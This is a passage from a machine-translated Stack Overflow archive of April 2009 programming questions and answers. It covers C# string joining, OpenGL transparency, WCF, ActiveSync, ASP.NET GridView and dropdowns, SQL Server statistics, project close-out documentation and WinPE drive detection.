    }
} 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-04-06T14:35:20.523

关于什么：

```
if (s.Length > 1)
{
    uiText = string.Format("{0} and {1}", string.Join(", ", s, 0, s.Length - 1), s[s.Length - 1]);
}
else
{
    uiText = s.Length > 0 ? s[0] : "";
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-04-06T15:00:51.070

最高效和可扩展的内存将使用 a`StringBuilder`并预先计算最终字符串的长度以消除缓冲区重新分配。（这类似于该`String.Concat`方法的工作原理。）

```
public static string Join(string[] items, string separator, string lastSeparator) {
    int len = separator.Length * (items.Length - 2) + lastSeparator.Length;
    foreach (string s in items) len += s.Length;
    StringBuilder builder = new StringBuilder(len);
    for (int i = 0; i < items.Length; i++) {
        builder.Append(items[i]);
        switch (items.Length - i) {
            case 1: break;
            case 2: builder.Append(lastSeparator); break;
            default: builder.Append(separator); break;
        }
    }
    return builder.ToString();
} 
```

用法：

```
string joined = Join(s, ", ", " or "); 
```

一个有趣的解决方案是使用递归算法。它适用于相当少量的字符串，但不能很好地扩展。

```
public static string Join(string[] items, int index , string separator, string lastSeparator) {
    return items[index++]  + (index == items.Length-1 ? lastSeparator + items[index] : separator + Join(items, index, separator, lastSeparator));
} 
```

用法：

```
string joined = Join(s, 0, ", ", " or "); 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-04-06T15:23:40.797

任何类型的通用解决方案`T`。

```
static class IEnumerableExtensions
{
  public static string Join<T>(this IEnumerable<T> items,
                               string seperator, string lastSeperator)
  {
    var sep = "";
    return items.Aggregate("", (current, item) =>
      {
        var result = String.Concat(current,
          // not first  OR not last
          current == "" || !items.Last().Equals(item) ? sep : lastSeperator,
          item.ToString());
        sep = seperator;
        return result;
      });
  }
} 
```

用法：

```
var three = new string[] { "Rob", "Jane", "Freddy" };
var two = new string[] { "Rob", "Jane" };
var one = new string[] { "Rob" };
var threeResult = three.Join(", ", " or "); // = "Rob, Jane or Freddy"
var twoResult = two.Join(", ", " or "); // = "Rob or Jane"
var oneResult = one.Join(", ", " or "); // = "Rob" 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-05-16T11:26:17.463

```
string[] name_storage = new[] { "emre" , "balc" };                              
name_storage[name_storage.Count() - 1] += "ı";
string name = name_storage[0];
string sur_name = name_storage[1];
divElement.InnerHtml += name + " - " + sur_name;
//result = emre - balcı 
```

# c++ - 如何在 OpenGL 中设置顶点的不透明度？

> ID：721705
> 
> 赞同：6
> 
> 时间：2009-04-06T14:28:37.640
> 
> 标签：c++, opengl, transparency, opacity

以下代码段绘制了一个灰色正方形。

```
glColor3b(50, 50, 50);

glBegin(GL_QUADS);
glVertex3f(-1.0, +1.0, 0.0); // top left
glVertex3f(-1.0, -1.0, 0.0); // bottom left
glVertex3f(+1.0, -1.0, 0.0); // bottom right
glVertex3f(+1.0, +1.0, 0.0); // top right
glEnd(); 
```

在我的应用程序中，在这个正方形后面存在一个彩色立方体。

我应该使用什么函数来使正方形（并且只有这个正方形）不透明？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-04-06T15:10:54.557

在 init 函数中，使用这两行：

```
glEnable(GL_BLEND);
glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA); 
```

在您的渲染函数中，确保`glColor4f`使用 代替`glColor3f`，并将第四个参数设置为所需的不透明度级别。

```
glColor4f(1.0, 1.0, 1.0, 0.5);

glBegin(GL_QUADS);
glVertex3f(-1.0, +1.0, 0.0); // top left
glVertex3f(-1.0, -1.0, 0.0); // bottom left
glVertex3f(+1.0, -1.0, 0.0); // bottom right
glVertex3f(+1.0, +1.0, 0.0); // top right
glEnd(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T14:31:08.240

glColor4f(float r,float g,float b,float alpha);
（在您的情况下可能是 clColor4b）
还确保启用了混合。
（您必须在之后将颜色重置为非 alpha，这可能涉及 glGet* 来保存旧的顶点颜色）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T14:46:14.787

您可以设置每个顶点的颜色

```
glBegin(GL_QUADS);
glColor4f(1.0, 0.0, 0.0, 0.5); // red, 50% alpha
glVertex3f(-1.0, +1.0, 0.0); // top left
// Make sure to set the color back since the color state persists
glVertex3f(-1.0, -1.0, 0.0); // bottom left
glVertex3f(+1.0, -1.0, 0.0); // bottom right
glVertex3f(+1.0, +1.0, 0.0); // top right
glEnd(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-06T14:32:45.290

使用`glColor4`而不是`glColor3`. 例如：

```
glBlendFunc(GL_SRC_ALPHA,GL_ONE);
glColor4f(1.0f,1.0f,1.0f,0.5f); 
```

# wcf - WPF/WCF 推送通知

> ID：721708
> 
> 赞同：14
> 
> 时间：2009-04-06T14:29:01.833
> 
> 标签：wcf, notifications

.NET 3.5（WCF 或其他）是否提供任何类型的推送通知服务？

* * *

我有一个服务器和一个客户端。我希望服务在服务器上运行，如果发生 x 则向客户端推送通知。我不想每 x 分钟拉一次服务器来收集信息。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-04-06T15:40:40.570

您的问题再笼统，但我会猜测并建议您查看[WCF 回调](https://stackoverflow.com/questions/1044174/what-steps-do-i-need-to-take-to-use-wcf-callbacks)。

我怀疑您的问题与 WPF 甚至 WF 有关，但如果您不这么认为，您将需要详细说明。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2011-02-07T02:12:33.737

您不需要使用任何回调。您可以将 MSMQ 与 WCF 一起使用。您可以使用我制作的附件示例。如果您将其发送为公共推送服务器 - 即通过 WebService 可用 - 您将必须添加将使用 MSMQ 的 Web 服务。问题是您需要在服务器和客户端上都安装 IIS。如果您在内部使用它，那么 MSMQ 就足够了。 [http://www.codeproject.com/KB/WCF/WcfMsmqServerPush.aspx](http://www.codeproject.com/KB/WCF/WcfMsmqServerPush.aspx)

# windows-mobile - 跨 Windows CE/Mobile 机器的 ActiveSync 支持

> ID：721710
> 
> 赞同：2
> 
> 时间：2009-04-06T14:29:40.787
> 
> 标签：windows-mobile, embedded, activesync

是否所有 Windows CE x86 机器都支持 ActiveSync，或者是否有任何例外？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T17:18:24.360

Windows CE 是一个模块化、组件化的操作系统。OEM 是否将 ActiveSync 组件包含到操作系统映像中完全取决于 OEM。它们还可以包括没有任何实体（联系人、日历等）同步功能的 ActiveSync 核心支持。

支持的传输（串行、USB、以太网、RNDIS 等）也是完全 OEM 可配置的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T14:39:05.367

您指的是哪个活动同步版本？

每个活动同步版本支持不同的 windows mobile 版本：

> [ActiveSync 4.5](http://www.microsoft.com/windowsmobile/en-us/help/synchronize/activesync-download.mspx)仅适用于以下版本的 Windows Mobile 操作系统：
> 
> *   移动版 6.1
> *   视窗移动 6.0
> *   视窗移动 5.0
> *   带有消息和安全功能包的 Windows Mobile 5.0
> *   Windows Mobile 2003 第二版
> *   视窗移动 2003
> 
> [ActiveSync 4.2](http://www.microsoft.com/downloads/details.aspx?FamilyID=7269173a-28bf-4cac-a682-58d3233efb4c&displaylang=en)支持以下移动设备操作系统：
> 
> *   Microsoft® Windows Mobile® 5.0
> *   适用于 Microsoft® Windows Mobile® 5.0 的消息传递和安全功能包
> *   Microsoft® Windows Mobile® 2003 第二版
> *   Microsoft® Windows Mobile® 2003
> *   Microsoft® Pocket PC 2002、Microsoft® Windows® CE 操作系统 3.0 版
> *   Microsoft® 智能手机 2002、Microsoft® Windows® CE 操作系统 3.0 版

此外，为了支持特定设备的主动同步，OEM 制造商**必须**安装已编译主动同步的 Windows CE/Mobile 操作系统（可以省略）。

# wcf - 为什么我的 Silverlight 应用程序无法使用 WCF 从实时站点上的 sql 加载数据？

> ID：721712
> 
> 赞同：2
> 
> 时间：2009-04-06T14:30:45.637
> 
> 标签：wcf, silverlight

当我在本地构建时，我的 silverlight 应用程序可以很好地从 SQL 加载数据，但是当我将其上传到实时站点时，它只会等待数据加载，但不会显示任何错误。它一直工作到昨天，我担心我可能在某处更改了设置，现在我似乎无法访问数据？

更新1：服务引用似乎有问题。每次我更新它们时，它都会清除 ServiceReferences.ClientConfig 文件，然后程序将无法构建。

更新 2：我尝试过清洁和建造，但仍然是同样的问题。

更新 3：尝试访问实时站点上的服务参考时发现错误：

这个集合已经包含一个带有 http 方案的地址。此集合中的每个方案最多可以有一个地址。参数名称：item 描述：在执行当前web请求的过程中发生了一个未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。

异常详细信息：System.ArgumentException：此集合已包含具有方案 http 的地址。此集合中的每个方案最多可以有一个地址。参数名称：项目

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:32:22.420

听起来您的应用程序正在等待某些东西，它会在 30 秒后超时吗？如果是这样，请检查您的 SQL 连接字符串。

如果 Silverlight 和 SQL 之间存在另一层（例如 Web 服务），则设置连接测试以确保 Silverlight 实际到达 SQL...

您是否不小心替换了您的实时 web.config 文件？如果是这样，请尝试恢复旧的 web.config，因为它的设置可能与您的服务器不兼容。

### 回复：更新 1：

有错误吗？如果有请粘贴。另外，请将相关配置文件粘贴到 pastebin 并从此处链接到它。

### 回复：更新 3：

错误“此集合已包含具有方案 http 的地址。” 是由于没有明确地告诉 WCF 服务您希望绑定到哪个地址，而有很多可供选择的地址。在这种情况下，IIS 似乎正在使用多个 URL，例如，考虑这些虚构的地址：

*   www.mysite.com
*   mysite.com

...所以 WCF 服务不知道要使用哪个，除非您告诉它。

解决方案是在 WCF 服务的 web.config（system.serviceModel 节点内）中明确定义要与以下配置行一起使用的 URL。

```
<serviceHostingEnvironment aspNetCompatibilityEnabled="true">
  <baseAddressPrefixFilters>
    <add prefix="http://www.mysite.com/SomeDirectory/MyService" />
  </baseAddressPrefixFilters>
</serviceHostingEnvironment> 
```

### 重要的：

您应该更新您的问题标题以表明 WCF 参与了您创建的解决方案。

# c# - 文件更改时通知？

> ID：721714
> 
> 赞同：119
> 
> 时间：2009-04-06T14:30:59.193
> 
> 标签：c#, file, filesystemwatcher

当磁盘上的文件被修改时，是否有某种机制可以通知我（在 C# 中）？

* * *

## 回答 #1

> 赞同：219
> 
> 时间：2009-04-06T14:35:09.043

你可以使用`[FileSystemWatcher](http://msdn.microsoft.com/en-us/library/system.io.filesystemwatcher(VS.71).aspx)`类。

```
public void CreateFileWatcher(string path)
{
    // Create a new FileSystemWatcher and set its properties.
    FileSystemWatcher watcher = new FileSystemWatcher();
    watcher.Path = path;
    /* Watch for changes in LastAccess and LastWrite times, and 
       the renaming of files or directories. */
    watcher.NotifyFilter = NotifyFilters.LastAccess | NotifyFilters.LastWrite 
       | NotifyFilters.FileName | NotifyFilters.DirectoryName;
    // Only watch text files.
    watcher.Filter = "*.txt";

    // Add event handlers.
    watcher.Changed += new FileSystemEventHandler(OnChanged);
    watcher.Created += new FileSystemEventHandler(OnChanged);
    watcher.Deleted += new FileSystemEventHandler(OnChanged);
    watcher.Renamed += new RenamedEventHandler(OnRenamed);

    // Begin watching.
    watcher.EnableRaisingEvents = true;
}

// Define the event handlers.
private static void OnChanged(object source, FileSystemEventArgs e)
{
    // Specify what is done when a file is changed, created, or deleted.
   Console.WriteLine("File: " +  e.FullPath + " " + e.ChangeType);
}

private static void OnRenamed(object source, RenamedEventArgs e)
{
    // Specify what is done when a file is renamed.
    Console.WriteLine("File: {0} renamed to {1}", e.OldFullPath, e.FullPath);
} 
```

* * *

## 回答 #2

> 赞同：68
> 
> 时间：2009-04-06T14:34:24.817

那将是[System.IO.FileSystemWatcher](http://msdn.microsoft.com/en-us/library/system.io.filesystemwatcher.aspx)。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-04-06T14:34:05.240

使用`FileSystemWatcher`. 您只能过滤修改事件。

# php - 为类似 Facebook 的新闻提要查询数据

> ID：721716
> 
> 赞同：0
> 
> 时间：2009-04-06T14:31:18.053
> 
> 标签：php, mysql

我有一个社交网站，用户可以在其中更新他们的心情、个人资料并添加照片。

我目前正在使用以下结构将所有更新记录在名为“update_log”的表中：

```
update_id int (auto), 
userid int, 
update_type int (1=profile, 2=photo, 3=mood)
pictureid int
mood_a int
mood_b int
mood_c int
update_time int 
```

配置文件更新记录：（自动）、1、1、0、0、0、0、1239003781

图片更新记录：(auto), 1, 2, 11544, 0, 0, 0, 1239003781

心情更新记录：（自动）、1、3、0、1、490、70、1239003781

对于照片记录，有一个相应的表 userphotos 保存标题和文件名/位置数据

对于情绪，有一个情绪查找表，其中包含情绪描述（即，我很懒 =\ ）

我需要做的是查询此数据以显示在用户的个人资料页面上，它将在过去 x 小时的活动中为他们最喜欢的任何用户显示此提要。

我遇到的问题是，如果用户在半小时左右的时间内上传了五张照片，我只想让它成为提要中的一行，而不是每张照片上传的条目。

个人资料更新也是如此。

我需要查询数据，以便用户会看到如下内容：

> 用户 x 更新了心情！（我累了）在 2009 年 4 月 4 日晚上 10:35
> 用户 y 在 2009 年 4 月 4 日晚上 10:20 上传了 x 张新照片
> 用户 x 在 2009 年 4 月 4 日晚上 10:15 更新了他们的个人资料

如何根据所有记录在一个小时内将照片更新分组到查询中返回的一条记录中？

有没有办法用一个查询来做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:38:40.173

你想要类似的东西

```
SELECT * FROM update_log WHERE update_time > NOW() - 30 MINUTES;
```

30分钟是你回顾的时间段。

我假设您只需要知道如何在单个查询中返回过去 30 分钟的更新。

如果您尝试将所有照片组合成 30 分钟的块，例如过去两天，您最好更改数据库结构并创建一个 photo_group 表 [包含主键、用户 ID 和时间创建] 并将 group_id 列添加到 update_log 表。

添加新照片时，请检查该用户在过去 30 分钟内创建的现有组。

```
SELECT * FROM photo_group WHERE user_id = XXX AND created > NOW () - 30 MINUTES;
```

如果不存在，则创建它。通过将 photo_group 表的主键添加为 update_log 中的 group_id 将照片链接到最新的。

当您稍后检索行时，您可以使用您的脚本语言按 group_id 对它们进行分组。

这种方法的缺点是您的分组结构以后很难修改，因为当您更改创建新组的规则时，以前的条目将按其旧组分组。

如果您想在不存储组的情况下执行此操作，则必须通过将照片分组到一个循环中来处理脚本语言中的逻辑，该循环检查照片的创建时间，如果它们将后面的照片分组到一个数组中已在特定时间段内创建，或使用与前一张不匹配的最新照片重新启动循环。这将比添加新表的开销更大，但以后更容易修改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T14:52:34.757

您是否考虑过尝试使用 PHP 而不是 SQL 查询来做到这一点？查询您需要的结果（这些时间之间的所有更新）然后使用 PHP 比较时间戳以确定它们应该如何分组可能不那么复杂。

# video - 音频或视频检测库

> ID：721717
> 
> 赞同：0
> 
> 时间：2009-04-06T14:31:24.060
> 
> 标签：video, audio, detection

我正在捕获音频和/或视频流。我有一组音频/视频剪辑，我想知道这些剪辑是否出现在流中。

对于可以做到这一点的图书馆有什么建议吗？

操作系统：Windows。语言： 不在乎 - 如果需要，我们将进行交互。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-08-26T12:25:19.473

我认为你有一点发展来实现这一点。从概念上讲，遵循的过程听起来很简单，但要完成这样的任务需要做很多工作。

您必须以某种速率或频率将文件分解为一组样本，然后在图像或声音片段中执行某种形式的散列函数，以便您可以比较散列的冲突，从而找到一组图像是两个流中都存在的相同或一组声音样本。

对于音频，您可以使用 NAudio 或 DirectX 来解码流。对于视频，您可以查看任何可以将视频文件解码为单独图像的库，例如 Directshow。

# connection - 使用 XIFF 保存和恢复连接

> ID：721719
> 
> 赞同：0
> 
> 时间：2009-04-06T14:31:37.537
> 
> 标签：connection, xmpp, xiff

我正在修改一段 JavaScript 代码，它使用 XMPP + XIFF flash 对象通过 Jabber 与 MSN/Yahoo/GTalk 进行通信。

网站的要求是启用页面刷新。

但是，问题是当前的 XIFF 实现不允许保存和恢复连接，而是每次都需要重新登录，这很耗时。

我找不到任何关于这种解决方案的参考。

有谁知道：

1.  XIFF 开源代码完全有可能吗？
2.  对此类解决方案的任何引用 - 也可以考虑 JavaScript 解决方案。

非常感谢！

提供酒吧

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-27T11:24:48.033

我不相信这是可能的。标准的解决方法是要么有一个单独的窗口，要么有某种形式的 IFRAME。

# c# - Gridview Sorting With Images

> ID：721722
> 
> 赞同：2
> 
> 时间：2009-04-06T14:32:18.380
> 
> 标签：c#, asp.net, gridview, sorting

I have a web app(ASP.NET 2.0 with C#), and in it I have a gridview that gets its data from an oracle database.

I needed to implement the sort function for the gridview, so I added a dropdownmenu right above the gridview with 2 choices: Ascending and Descending. Then in the `Gridview_Sorting` method, I have a switch statement that basically checks the selection on the dropdown menu, and sorts accordingly.

This works, but I want to be able to click it once, and it sorts one way, then click it again, and it sorts the other way. Another thing I'd like to have would be images beside the column names that tell you which direction the data is sorted in.

Any suggestions? Thank you.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T14:41:46.220

Check out this [blog post](http://geekswithblogs.net/ram/archive/2006/07/13/GridViewGenericSortImagesFunction.aspx) for a generic subroutine to handle this

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T14:41:25.393

A simple solution would be to use an image control or image button. On the click event, toggle the image from 1 image to the other. To determine previous state, either use a session variable or determine what the image button's imageurl property was previously set to, toggle it and call your sort method.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-02-11T13:41:53.160

I use JQuery table sorter. Client side sorting is quicker on the front end and this plugin allows you to specify images that display in the headings of your columns:

[http://tablesorter.com/docs/](http://tablesorter.com/docs/)

I am not sure what the impact will be when working with selection and interaction with this method, so beware.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-04T13:34:20.603

I add the image to the header cell on sorting :

```
// ...

GridViewRow headerRow = GridView1.HeaderRow;

foreach (TableCell tableCell in headerRow.Cells)
{
    if (tableCell.HasControls())
    {
        LinkButton button = tableCell.Controls[0] as LinkButton;
        if (button != null)
        {                                            
            if (sortExp == button.CommandArgument)
            {
                Image image = new Image();
                if (sortDir == "ASC")
                {
                    image.ImageUrl = "/_layouts/Document LibraryManager/icon_ascending.gif";
                    tableCell.Controls.Add(image);
                }
                else
                {
                    image.ImageUrl = "/_layouts/Document LibraryManager/icon_descending.gif";
                    tableCell.Controls.Add(image);
                }
            }
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-15T14:03:18.023

The simplest and elegant way to do it is to use **ViewState**. Persist the sort direction in ViewState and access it each time sorting occurs.

```
public SortDirection GridViewSortDirection
    {
        get
        {
            if (ViewState["sortDirection"] == null || (SortDirection)ViewState["sortDirection"] == SortDirection.Descending)
                ViewState["sortDirection"] = SortDirection.Ascending;
            else if ((SortDirection)ViewState["sortDirection"] == SortDirection.Ascending)
                ViewState["sortDirection"] = SortDirection.Descending;

            return (SortDirection)ViewState["sortDirection"];
        }
        set
        { ViewState["sortDirection"] = value; }
    } 
```

If no sorting has been done previously(*null condition*) or previous sort direction was descending, next time sorting should happen in ascending order. Similarly, vice-versa.

# c# - 如何将参数传递给 DataRow 的 Add 方法？

> ID：721725
> 
> 赞同：1
> 
> 时间：2009-04-06T14:32:40.670
> 
> 标签：c#, datarow

DataRow Add 方法的方法签名之一是：

```
DataRow.Add(params object[] values) 
```

使用上述内容时，如果我传递一些字符串，例如，我是否必须像以下那样做：

```
DataRow.Add(new object[]{"a","b","c"}); 
```

或者我可以像下面这样：

```
DataRow.Add("a","b","c"); 
```

两种方式都行吗？

使用 AddRange 方法将添加列传递到 DataTable 时，同样的问题适用于 DataColumns 的集合。我是否必须使用 DataTable.Columns.AddRange(new DataColumn[]{}) 还是可以只传递列而不实例化新数组（这意味着它是否间接执行）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T14:33:26.863

是的，两种方式都可以。`params`关键字就是这样的魔法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T14:33:41.090

是的，两者都可以正常工作。尽管第二种语法更可取。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T14:34:10.747

恕我直言，两种方式都应该有效，因为签名将数组声明为“参数”参数。如果该方法不能以这种方式处理它，他们就不应该将数组参数声明为“params”。

# drop-down-menu - 在下拉列表控件中需要帮助

> ID：721731
> 
> 赞同：0
> 
> 时间：2009-04-06T14:33:28.127
> 
> 标签：drop-down-menu

我对下拉列表有可笑的问题。通过 for 循环，我插入了日、月和年的下拉值。但是当我从下拉列表中选择日、月和年后提交表单时，列表项值在每次提交后重新索引。例如，1970 年到 2009 年的第 1 天到第 31 天，第 1 到 12 个月。提交表单后每个下拉列表的列表项都变成双倍。就像在提交之前的天下拉列表中一样，如果我检查下拉列表，则在提交后它是 1 到 31，该值将是 1 到 31 的两倍，我的意思是 1 到 31 再次发生在列表项内的 1 到 31对于每个下拉列表。这是我的代码：aspx：

```
<asp:DropDownList ID="DropDownDay" runat="server">
                    <asp:ListItem Text="Select Day"></asp:ListItem>                   
</asp:DropDownList>
<asp:DropDownList ID="DropDownMonth" runat="server">
                    <asp:ListItem Text="Select Month"></asp:ListItem>
 </asp:DropDownList>
                    <asp:DropDownList ID="DropDownYear" runat="server">
                    <asp:ListItem Text="Select Year"></asp:ListItem>                   
  </asp:DropDownList>
aspx.cs:
//Inserting day in the day dropdown list.
        for (int i = 1; i <=31; i++)
        {
            ListItem item = new ListItem();
            item.Value = i.ToString();
            DropDownDay.Items.Add(item.Value);
        }
        //Inserting month in the month dropdown list.
        for (int i = 1; i <=12; i++)
        {
            ListItem item = new ListItem();
            item.Value = i.ToString();
            DropDownMonth.Items.Add(item.Value);
        }
        //Inserting year in the year dropdown list.
        for (int i = 1970; i <=2009; i++)
        {
            ListItem item = new ListItem();
            item.Value = i.ToString();
            DropDownYear.Items.Add(item.Value);
        }
string day = DropDownDay.Text;
string month = DropDownMonth.Text;
string year = DropDownYear.Text;
After adding i have set:
DropDownDay.SelectedIndex = 0;
DropDownMonth.SelectedIndex = 0;
DropDownYear.SelectedIndex = 0; 
```

谢谢， 苏米特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T14:37:45.153

您可能没有检查 Page.IsPostBack 选项

如果是真的，那么不要重新填充你的下拉列表

# sql-server - SQL Server 中的统计计算

> ID：721734
> 
> 赞同：2
> 
> 时间：2009-04-06T14:34:03.117
> 
> 标签：sql-server, statistics

有谁知道在 SQL Server 存储过程中进行简单统计分析（例如置信区间或方差分析）的任何包或源代码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-13T14:30:04.803

您可能不想这样做的原因是因为这些计算是 CPU 密集型的。SQL Server 通常通过 CPU 插槽获得许可（Standard 大约为 $5k/cpu，Enterprise 为 $20k/cpu），因此 DBA 对任何想要在 SQL Server 本身上消耗大量 CPU 功率的应用程序都非常敏感。如果您开始进行统计计算并且突然服务器需要另一个 CPU，那么这是一个昂贵的许可提议。

相反，在单独的应用程序服务器上进行这些统计计算是有意义的。通过线路查询数据到您的应用服务器，在那里进行数字运算，然后通过更新语句或存储过程将结果发送回。是的，这需要更多的工作，但是随着您的应用程序的增长，您将不会面临昂贵的许可费用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T14:36:28.150

在较新版本的 SQL Server 中，您可以本机使用 .net 对象。所以任何 .net 包都可以。除此之外，总是有外部过程调用......

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-08T13:47:21.857

除非您必须在存储过程中执行此操作，否则我会检索数据并在 SQL Server 之外执行此操作。这样，您可以从任何开源或商业统计例程中进行选择，而且速度可能也会更快。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-02-22T02:42:36.837

我不知道是否存在这样的商业包。这可能有多种原因，其中一些已在上文中概述。如果您想要完成的是避免构建处理存储在 SQL Server 中的数据的统计函数，您可能希望通过从数据库服务器导入数据来尝试将统计包与数据库服务器集成。比如[R支持](http://cran.r-project.org/doc/manuals/R-data.pdf)，还有[CRAN](http://cran.r-project.org/web/packages/RODBC/)

完成此操作后，您仍然希望在 SQL Server 中运行统计分析，接下来的步骤是使用命令行界面从存储过程**调用您的 stats 包。**您最好的选择可能是[xp_cmdshell](http://msdn.microsoft.com/en-us/library/ms175046.aspx)，尽管它需要仔细配置才能不损害您的 SQL Server 安全性。

# documentation - 关闭一个项目——关键的事情是什么？

> ID：721751
> 
> 赞同：0
> 
> 时间：2009-04-06T14:37:30.067
> 
> 标签：documentation, history, projects, maintenance

看来我们的客户很可能会取消我们已经工作了 15 个月的项目。

它有可能（尽管不太可能）会在某个时候重新启动。

在此过程中，我们还在多个领域扩展了我们公司的产品。其他项目团队可能需要进行类似的扩展，我们希望他们能够利用我们所做的。

那么，要为后代记录哪些关键内容，以便未来的团队（可能包括不同的人员）可以从我们所做的事情中学习？

这与为未来的维护者记录的内容略有不同，因为人们到达时可能对我们的项目很少/不熟悉，并且可能不会有任何扩展参与。

到目前为止，我们一直致力于收集有关每个主要功能/扩展的信息——因此有一个地方可以查找需求、指向源代码的指针、测试用例等，并正在添加一些关于关键设计点/决策等的叙述。

当项目团队仍然在一起时，我们还应该做什么和捕捉什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:41:18.403

我知道这不是很具体。但是对于您对设计或技术选择做出的每一个重大决定，请务必记录“为什么”。

这有助于进一步推进，特别是如果将来从事该项目的人员与原始团队不同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T14:42:30.523

确保保存您的存储库，或每个文件历史记录的某种表示形式。它真的很有用，在没有知识的情况下进入一些东西，看看它是如何演变的，以及何时引入了某些特性（或错误）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T14:48:18.217

您可能想查看以下帖子：[您的验尸会议格式是什么？](https://stackoverflow.com/questions/38066/whats-your-post-mortem-meeting-format/38073)

虽然它不能涵盖您想要的所有内容，但它可能是一个很好的起点。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T14:48:12.520

这不仅应该在项目将要关闭的情况下完成，而且还应该作为一个干净的项目完成。正如您在项目管理文献中看到的那样，有一个项目结束文档，这将使局外人有可能进入项目。所以你的任务并不少见。

首先为项目源代码创建一个专门的地方，也许可以用浏览器浏览，所以查看你的团队所做的事情的障碍非常小。还要确保您的文档（架构等）可用。在此之后，您可以开始编写项目体验 wiki，您可以在其中以干净且可追溯的方式链接某些人工制品。也许有一个维基页面来解决您遇到的非常棘手的问题和解决方案。如果你有这个，其他人应该很容易利用你对项目的了解。

# deployment - 如何从脚本中检测启动的 USB 驱动器的驱动器号？

> ID：721755
> 
> 赞同：5
> 
> 时间：2009-04-06T14:38:17.333
> 
> 标签：deployment, vbscript, batch-file, winpe

我从可引导的 UFD 启动 WinPE 2，我需要检测驱动器号以便告诉 ImageX 在哪里可以找到 WIM。但是，根据我正在成像的机器，有不同的安装驱动器。

我需要一种方法来始终将 UFD 安装在 P: 或其他位置。有没有办法检测机器启动的驱动器的盘符，或者有另一种方法可以将我的 WIM 文件的位置传递给可从 startnet.cmd 访问的变量？

这是 TechNet 上遇到相同问题的其他人。

[http://social.technet.microsoft.com/Forums/en-US/itprovistadeployment/thread/3e8bb8db-a1c6-40be-b4b0-58093f4833be?prof=required#](http://social.technet.microsoft.com/Forums/en-US/itprovistadeployment/thread/3e8bb8db-a1c6-40be-b4b0-58093f4833be?prof=required#)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T20:28:53.310

此 VBScript 将为每个可移动驱动器显示一条消息（字母：描述），可以轻松修改以搜索特定驱动器并返回该字母。

```
 strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

Set colDisks = objWMIService.ExecQuery("Select * from Win32_LogicalDisk where MediaType = 11")

For Each objDisk in colDisks
    Wscript.Echo objDisk.DeviceID & objDisk.Description
Next 
```

不知道这是否有帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-17T08:30:20.797

与此处提到的其他解决方案相比，它是一个不太通用的解决方案，但似乎有一种特定的方法可以确定从哪个底层卷启动“RAM 驱动器启动”的 Windows PE 操作系统。从[Windows 自动安装工具包](http://www.microsoft.com/downloads/details.aspx?FamilyID=C7D4BC6D-15F3-4284-9123-679830D629F2&displaylang=en)中有关 Windows PE 的文档中：

> 如果您没有启动 Windows 部署服务，确定 Windows PE 从何处启动的最佳方法是首先检查 PEBootRamdiskSourceDrive 注册表项。如果不存在，请扫描正确 PEBootType 的驱动器并查找某种标识引导驱动器的标记文件。

（有问题的注册表值位于 HKLM\SYSTEM\CurrentControlSet\Control 下。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T18:16:34.737

这是一个非最佳解决方案。在这种情况下，UFD 必须有一个特定的名称，该名称将传递给脚本，该脚本搜索每个可能的驱动器号以查找匹配项。依靠同名的闪存驱动器可能不切实际。

仍然希望有人能提供更好的答案！

```
setlocal

:: Initial variables
set TMPFILE=%~dp0getdrive.tmp
set driveletters=abcdefghijklmnopqrstuvwxyz
set MatchLabel_res=

for /L %%g in (2,1,25) do call :MatchLabel %%g %*

if not "%MatchLabel_res%"=="" echo %MatchLabel_res%

goto :END

:: Function to match a label with a drive letter. 
::
:: The first parameter is an integer from 1..26 that needs to be 
:: converted in a letter. It is easier looping on a number
:: than looping on letters.
::
:: The second parameter is the volume name passed-on to the script
:MatchLabel

:: result already found, just do nothing 
:: (necessary because there is no break for for loops)
if not "%MatchLabel_res%"=="" goto :eof

:: get the proper drive letter
call set dl=%%driveletters:~%1,1%%

:: strip-off the " in the volume name to be able to add them again further
set volname=%2
set volname=%volname:"=%

